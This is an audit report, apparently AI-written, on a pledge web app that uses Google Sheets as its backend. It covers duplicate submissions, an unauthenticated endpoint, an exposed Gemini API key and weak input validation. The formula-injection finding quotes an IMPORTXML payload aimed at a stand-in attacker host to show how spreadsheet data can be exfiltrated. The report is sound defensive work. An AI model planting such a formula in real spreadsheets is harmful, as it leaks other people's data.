# 🛡️ Comprehensive Security & Code Quality Audit

**Target Application:** Flag Pledge Initiative
**Audit Date:** 2024-05-23
**Auditor:** Jules (AI Security Architect)

---

## 🚨 Executive Summary

This audit reveals **2 High Severity** and **3 Medium Severity** issues. The most critical findings relate to **API Key Exposure** and **Duplicate Data Submission**, which jeopardize data integrity and API quotas. The application follows a "Serverless" architecture using Google Sheets as a backend, which introduces specific risks regarding input validation and access control.

---

## 📂 1. Logic & Architecture

### 🔴 1.1 Duplicate Data Submission (Critical Logic Flaw)
- **What is the issue?**
  When a user completes the pledge, the application submits their data **twice** to two different destinations.
  1. `App.tsx` calls `saveUserData()` (from `dataStore.ts`) which sends data to Script URL A.
  2. `Success.tsx` immediately calls `DB.submitForm()` (from `db.ts`) which sends data to Script URL B.
- **Why is it dangerous?**
  - **Data Corruption:** You likely have two Google Sheets collecting data, but they may not match if one fails.
  - **Performance:** Wastes user bandwidth and increases latency.
  - **Maintenance Nightmare:** Changing logic in one place won't update the other.
- **Where does it exist?**
  - `App.tsx` (Line 101)
  - `components/Success.tsx` (Line 39)
- **How to fix it:**
  1. **Decide** which service file (`db.ts` or `dataStore.ts`) is the "source of truth". (Recommendation: `db.ts` seems more robust).
  2. **Remove** the `saveUserData` call from `App.tsx`.
  3. **Ensure** `DB.submitForm` is the *only* place submitting data.
- **Severity:** **HIGH**

---

## 🔐 2. Backend & API Security (Google Apps Script)

### 🟠 2.1 Spreadsheet Formula Injection (CSV Injection)
- **What is the issue?**
  The Google Apps Script (`GoogleAppsScript.js`) takes user input and directly appends it to a spreadsheet using `sheet.appendRow(row)`.
- **Why is it dangerous?**
  If a malicious user enters a name like `=IMPORTXML("http://evil.com/steal", "//a")`, Google Sheets will execute this formula when an admin opens the sheet. This can:
  - Exfiltrate data from your spreadsheet to a hacker's server.
  - Crash the spreadsheet (DoS).
- **Where does it exist?**
  - `GoogleAppsScript.js` (Line 28: `sheet.appendRow(row)`)
- **How to fix it:**
  - **In the Google Apps Script:** Prepend a single quote `'` to every string field before saving. This forces Sheets to treat it as text, not a formula.
  ```javascript
  // Fix Example
  var row = [
      "'" + data.id,
      "'" + data.schoolName,
      // ...
  ];
  ```
- **Severity:** **MEDIUM**

### 🟠 2.2 Unprotected Public API Endpoint
- **What is the issue?**
  The Google Script URLs in `db.ts` and `dataStore.ts` are publicly accessible to anyone with the link. There is no authentication (API Key / Token) required to POST data.
- **Why is it dangerous?**
  - **Spam/DoS:** A bot can flood your sheet with millions of fake entries, hitting Google's quotas and making the sheet unusable.
  - **Cost:** If you use paid services hooked to this, it will cost money.
- **Where does it exist?**
  - `services/db.ts` (`GOOGLE_SCRIPT_URL`)
  - `services/dataStore.ts` (`SCRIPT_URL`)
- **How to fix it:**
  1. **Add a Secret Token:** In your Frontend code, send a secret header or body param (e.g., `auth_token: "my-secret-123"`).
  2. **Verify in Script:** In `GoogleAppsScript.js`, check if `data.auth_token === "my-secret-123"`. If not, return error.
  *(Note: Since the frontend code is public, this is "security by obscurity", but it stops basic automated bots).*
- **Severity:** **MEDIUM**

---

## 🔑 3. Secrets & Configuration

### 🔴 3.1 API Key Leak (Gemini API)
- **What is the issue?**
  The `vite.config.ts` file exposes `GEMINI_API_KEY` to the client-side code using `define`.
- **Why is it dangerous?**
  - **Theft:** Anyone visiting your site can Inspect Source and find your API Key.
  - **Abuse:** They can use your quota to run their own AI queries, potentially costing you money or exhausting your limits.
- **Where does it exist?**
  - `vite.config.ts` (Lines 14-15)
- **How to fix it:**
  - **Never** expose private API keys to the frontend.
  - **Solution:** Create a small backend proxy (e.g., Vercel Serverless Function) that holds the key. The frontend calls *your* backend, and your backend calls Gemini.
  - *If you are not actually using Gemini in the frontend, remove this configuration immediately.*
- **Severity:** **HIGH**

---

## 💻 4. Frontend & Code Quality

### 🟡 4.1 Missing Input Validation
- **What is the issue?**
  The `UserForm.tsx` checks if fields are not empty, but does not validate format.
- **Why is it dangerous?**
  - Users can enter "abc" as a phone number or "not-an-email" as an email.
  - Pollutes your database.
- **Where does it exist?**
  - `components/UserForm.tsx` (Lines 166-172)
- **How to fix it:**
  - Use Regex for validation.
  ```typescript
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  const phoneRegex = /^[0-9]{10}$/;
  // Check if emailRegex.test(userData.email)
  ```
- **Severity:** **LOW**

### 🟡 4.2 Sensitive Data Logging
- **What is the issue?**
  The code logs user PII (Personal Identifiable Information) to the browser console.
- **Why is it dangerous?**
  - If a user is on a shared computer, their data remains in the browser logs/history potentially.
  - It's a bad privacy practice.
- **Where does it exist?**
  - `components/UserForm.tsx` (Line 177: `console.log('👤 User Data:', userData)`)
  - `services/dataStore.ts` (Line 17)
- **How to fix it:**
  - Remove all `console.log` statements containing `userData` or `payload` before production.
- **Severity:** **LOW**

### 🟡 4.3 Missing Subresource Integrity (SRI)
- **What is the issue?**
  External scripts (`html2canvas`, `cropperjs`) are loaded from `cdnjs` without integrity checks.
- **Why is it dangerous?**
  - If `cdnjs` is compromised, attackers could inject malicious code into your users' browsers.
- **Where does it exist?**
  - `index.html`
- **How to fix it:**
  - Use a tool like [srihash.org](https://www.srihash.org/) to generate hashes for the CDN links and add `integrity="sha384-..." crossorigin="anonymous"` to the `<script>` tags.
- **Severity:** **LOW**

---

## 📋 Recommended Action Plan

1.  **Immediate Fixes (Today):**
    -   Address **3.1 (API Key)**: Remove Gemini key from `vite.config.ts` if unused, or move to backend.
    -   Address **1.1 (Duplicate Logic)**: Consolidate data submission to `db.ts` and remove the double call in `App.tsx`.
    -   Address **2.1 (Formula Injection)**: Update `GoogleAppsScript.js` to escape inputs with `'`.

2.  **Next Steps (This Week):**
    -   Address **4.1 (Validation)**: Add Regex checks in `UserForm.tsx`.
    -   Address **4.2 (Logging)**: Clean up `console.log`.

3.  **Long Term:**
    -   Consider moving from Google Sheets to a real database (e.g., Supabase, Firebase) for better security and performance.
